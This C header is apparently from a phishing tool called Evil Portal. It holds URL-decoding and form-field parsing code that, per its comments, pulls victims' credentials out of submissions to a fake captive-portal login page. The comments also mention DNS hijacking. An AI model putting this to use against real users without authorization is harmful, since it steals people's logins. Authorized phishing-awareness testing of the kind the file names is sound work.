// Pure captive-portal form decode for Evil Portal — host-testable.
// Evil Portal serves a fake login page; when a victim submits, the credentials
// arrive as a urlencoded POST body. This file pulls a field out and decodes it.
// The DNS hijack + HTTP server is bring-up. For authorized phishing-awareness
// testing on your own network only.
#pragma once
#include <stddef.h>
#include <stdint.h>

static inline int url_hexval(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}

// Percent-decode `in` into `out`: %XX -> byte, '+' -> space. Truncates to cap.
static inline void url_decode(const char *in, char *out, size_t cap) {
  size_t o = 0;
  for (size_t i = 0; in[i] && o + 1 < cap; i++) {
    if (in[i] == '+') { out[o++] = ' '; }
    else if (in[i] == '%' && url_hexval(in[i+1]) >= 0 && url_hexval(in[i+2]) >= 0) {
      out[o++] = (char)((url_hexval(in[i+1]) << 4) | url_hexval(in[i+2]));
      i += 2;
    } else { out[o++] = in[i]; }
  }
  out[o] = 0;
}

// Find `key` in a urlencoded body ("a=b&c=d") and url-decode its value into out.
// Matches whole keys only (so "pass" won't match "passcode"). false if absent.
static inline bool form_get(const char *body, const char *key,
                            char *out, size_t cap) {
  if (!body || !key || !out || cap == 0) return false;
  size_t klen = 0; while (key[klen]) klen++;
  for (const char *p = body; p && *p; ) {
    const char *eq = p;
    while (*eq && *eq != '=' && *eq != '&') eq++;
    if (*eq == '=' && (size_t)(eq - p) == klen) {
      bool match = true;
      for (size_t i = 0; i < klen; i++) if (p[i] != key[i]) { match = false; break; }
      if (match) {
        const char *v = eq + 1;
        const char *end = v; while (*end && *end != '&') end++;
        char tmp[256];
        size_t n = (size_t)(end - v) < sizeof tmp - 1 ? (size_t)(end - v) : sizeof tmp - 1;
        for (size_t i = 0; i < n; i++) tmp[i] = v[i];
        tmp[n] = 0;
        url_decode(tmp, out, cap);
        return true;
      }
    }
    const char *amp = eq; while (*amp && *amp != '&') amp++;
    p = (*amp == '&') ? amp + 1 : 0;
  }
  return false;
}
